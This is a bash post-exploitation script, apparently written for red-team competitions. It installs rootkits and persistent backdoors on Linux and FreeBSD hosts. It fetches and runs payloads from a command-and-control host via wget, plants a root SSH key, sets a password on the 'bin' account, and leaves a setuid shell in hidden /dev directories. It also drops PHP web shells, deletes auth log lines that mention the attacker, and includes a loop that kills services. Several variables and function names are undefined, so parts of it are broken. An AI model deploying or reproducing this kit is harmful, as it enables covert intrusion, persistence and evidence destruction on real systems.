#!/bin/bash
#cmc
#sapling
#3/6/15
#install rootkit & backd00rz
#kill services
#why jericho? 
#because tony stark. https://www.youtube.com/watch?v=YBC1Qob27sM&t=38s
#h4xh4xh4x
#note to random github threatresearcher:
#this is for redteam competition use. no leet haxors here. move along.
#TO DEPLOY, run: export HISTFILE=/dev/null; wget -q $C2_URL/jericho2.1.sh -O /dev/stdout | /bin/bash - && history -c
#
# this creates 5 ways back in:
# 1) rootkit (CentOSx64)
# 2) root ssh key
# 3) trixd00r backdoor
# 4) rooty icmp backdoor
# 5) backdoored 'bin' system account (with setuid(0) shell in "/dev/  /" for re-elevation)
#
#  Also removes errbuddy from `who`
#  Also installs root crontab to clear iptables rules every 5m. (disabled/uncomment iptables stuff below if needed)
#  Also runs a bash script that takes down all services every 10s.
#  Also drops a basic php shell in webdirs. http://url/.src.php?e=uptime
# 
# TODO: Start trojanising /etc/init.d scripts. Start service again? service turns off.
# TODO: write wrapper for passwd, that just says it changed password. doesn't actually do it.
# ________________________
#< HERE COMES THE REDTEAM >
# ------------------------
#        \   ^__^
#         \  (oo)\_______
#            (__)\       )\/\
#                ||----w |
#                ||     ||

#backdoor key
SHARED_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKcAi3VkTNZOQsLiiPvE8gyThrLzD2w8g1aN4VArx8ksOfVteVRfDtjWVLgLpdbySjaIBXn4WeViqxf1TZ8fq5loN4tcHnFOvtBs30JQ1JktwXqwvZaHomqZGJeP0IHLK9rYsJZnHbyk4u2qgs/vpM3wkhX86ywpDzTo+xTEV+XPuCBP+e7QIDuBM20rXkHEroIssYDjSus9o3issH/u+iguGulJaW534mZ9YiC6ELoDKLpQ0wCgwEjLfg04Tz6L6mKBjkyq86wb5iDo0+5zrY5XKOJB5BiBsvAULBnA3to203ZaGrJWQP1CdPbpOINHkTekoWJt5W40LSD41pE86z"

### CHANGE ME ###

C2_URL="http://172.25.58.142/"
C2_IP="172.25.58.142"

#################

#fedora kit
FEDORA_KIT="fedx32.bin"

FEDORA64_KIT="fedx64.bin"

#Ubuntu 64bit kit
UBUNTU64_KIT="ubux64.bin"

UBUNTU_KIT="ubux32.bin"

#Launch BSD Rathole
BSD_KIT="hole.bin"

#trixd00r 
TRIXDOOR="trixd00rd-static-ubuntu"

#rooty
ROOTY="rooty-release.x86"

#rooty for BSD
ROOTYBSD="rootybsd.x64"

ARCH=`uname -i`

function do_backdoors() {
        echo "removing utmp.."
        rm -rf /var/run/utmp
        echo "installing root ssh key!"
        chattr -i /root/.ssh/authorized*
        echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys2
        echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys
        chattr +i /root/.ssh/authorized_keys*
        echo "dropping trixd00r.." 
        mkdir /dev/...;cd /dev/...; wget -q $C2_URL$TRIXDOOR -O rsyslogd;chmod +x rsyslogd;env PATH=$PWD MANAGER=$C2_IP /usr/bin/nohup rsyslogd &
        echo "dropping rooty.."
        mkdir /dev/...;cd /dev/...;wget -q $C2_URL$ROOTY -O udevd; chmod +x udevd; env PATH=$PWD /usr/bin/nohup udevd &
        #echo "adding 5m disable iptables crontab.."
        #echo "*/5 * * * * /sbin/iptables -F" | crontab -
        echo "backdoor bin account! pass=lol123"
        sed -i -e 's/bin:\*:/bin:$6$OkgT6DOT$0fswsID8AwsBF35QHXQVmDLzYGT.pUtizYw2G9ZCe.o5pPk6HfdDazwdqFIE40muVqJ832z.p.6dATUDytSdV0:/g' /etc/shadow
        usermod -s /bin/sh bin
        echo "setuid /bin/sh! for use with bin account"
        mkdir "/dev/  "
        cp /bin/sh "/dev/  /pwnd"
        chmod 777 "/dev/  /pwnd"
        chown root:root "/dev/  /pwnd"
        chmod u+s "/dev/  /pwnd"
        echo "clear all logs with my IP in it.."
        sed -ie "/$C2_IP/d" /var/log/auth.log /var/log/messages /var/log/secure
        sed -ie "/passwd/d" /var/log/auth.log /var/log/messages /var/log/secure
        sed -ie "/Accepted password for bin/d" /var/log/auth.log /var/log/messages /var/log/secure
        sed -ie "/Accepted password for root/d" /var/log/auth.log /var/log/messages /var/log/secure
        echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/.src.php
        chmod 777 /var/www/.src.php
        echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/html/.src.php
        chmod 777 /var/www/html/.src.php
}

function do_bsdbackdoors() {
        echo "installing root ssh key!"
        echo $PUBKEY >> /root/.ssh/authorized_keys2
        echo $PUBKEY >> /root/.ssh/authorized_keys
        chattr +i /root/.ssh/authorized_keys*
        echo "dropping rooty.."
       	mkdir /dev/;cd /dev/;wget -q $C2_URL$BSDROOTY -O udevd; chmod +x udevd; env PATH=$PWD /usr/bin/nohup udevd &
        echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/.src.php
        chmod 777 /var/www/.src.php
        echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/html/.src.php
        chmod 777 /var/www/html/.src.php
}


function do_centos_rootkit() {
	echo "Retrieving CentOS x86 kit..."
	mkdir /dev/... 
	cd /dev/...
	wget -q $C2_URL$CENTOS_KIT
	chmod +x `basename $CENTOS_KIT`
	./`basename $CENTOS_KIT`
}

function do_centos64_rootkit() {
	echo "Retrieving CentOS x64 kit..."
	mkdir /dev/...
	cd /dev/...
	wget -q $C2_URL$CENTOS64_KIT
	chmod +x `basename $CENTOS_KIT`
	./`basename $CENTOS_KIT`
}


function do_freebsd64_rootkit() {
    cd /opt/
    wget -q $C2_URL$BSD_KIT
    chmod 0755 `basename $BSD_KIT`
    mv `basename $BSD_KIT` /opt/scorebotd
    nohup /opt/scorebotd &
}

function do_ubuntu_rootkit() {
	echo "Retrieving ubuntu x86 kit..."
	mkdir /dev/...
	cd /dev/...
	wget -q $C2_URL$UBUNTU_KIT
	chmod +x `basename $UBUNTU_KIT`
	./`basename $UBUNTU_KIT`
}


function do_ubuntu64_rootkit() {
echo "Retrieving ubuntu x64 kit..."
    mkdir /dev/... 
    cd /dev/...
    wget -q $C2_URL$UBUNTU64_KIT
    chmod +x `basename $UBUNTU64_KIT`
    ./`basename $UBUNTU64_KIT`
}

function goodbye_sla() {
    cat <<EOF > /usr/share/service.sh
#!/bin/bash
#UMAD?

while [ 0 ]
do
	service httpd stop
	service postfix stop
	service sendmail stop
	service mysql stop
	service webmin stop
        service named stop
        service bind stop
	killall -9 webmin.pl
	killall -9 apache2
        killall -9 httpd
        killall -9 named
	killall -9 mysqld_safe
	killall -9 mysqld
        sleep 10
done
EOF
chmod +x /usr/share/service.sh
nohup /usr/share/service.sh >/dev/null 2>&1 &
}

#64bit fedora
if [[ $ARCH -eq "x86_64" ]] && [[ -f "/etc/redhat-release" ]]; then
	do_centos64_rootkit
	do_backdoors
fi

#32bit fedora
if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/redhat-release" ]]; then
	do_centos_rootkit
	do_backdoors
        #goodbye_sla
fi


#ubuntu/debian 64bit 
if [[ $ARCH -eq "x86_64" ]] && [[ -f "/etc/debian_version" ]]; then
    do_ubuntu64_rootkit
    do_backdoors
    #goodbye_sla
fi

#ubuntu/debian 32bit (assumed if not 64, whatever)
if [[ $ARCH -ne "x86_64" ]] && [[ -f "/etc/debian_version" ]]; then
	do_ubuntu32_rootkit
	do_backdoors
	#goodbye_sla
fi


#freebsd
if [[ `uname`  == 'FreeBSD' ]]; then
	do_freebsd64_kit
	do_bsdbackdoors    
fi
